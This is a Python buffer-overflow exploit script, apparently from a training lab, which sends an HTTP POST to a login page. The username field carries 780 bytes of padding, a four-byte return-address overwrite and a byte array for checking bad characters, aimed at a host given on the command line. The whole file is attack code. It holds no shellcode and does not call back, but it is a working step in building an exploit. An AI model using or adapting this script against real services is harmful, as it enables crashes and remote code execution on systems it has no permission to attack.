import sys, socket

OFFSET = 780

# Manual 0, 0xa, x0d, x25, x26, x2b, x3d
bad_chars = b"\x00\x0a\x0d\x25\x26\x2b\x3d"

# Credit hack south for template.
buf = b"A" * OFFSET
buf += b"BBBB"
buf += bytes([b for b in range(256) if b not in bad_chars])

# Adding our buffer to the body.
body = b"username=" + buf + b"&password=A"

# Our request to modify.
req = b"POST /login HTTP/1.1\r\n"
req += b"Host: 192.168.102.129\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Referer: http://192.168.102.129/login\r\n"
req += b"Connection: close\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"\r\n"
req += body

print('[+] Sending payload...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
s.send(req)
s.close()
print('[+] Payload sent.')
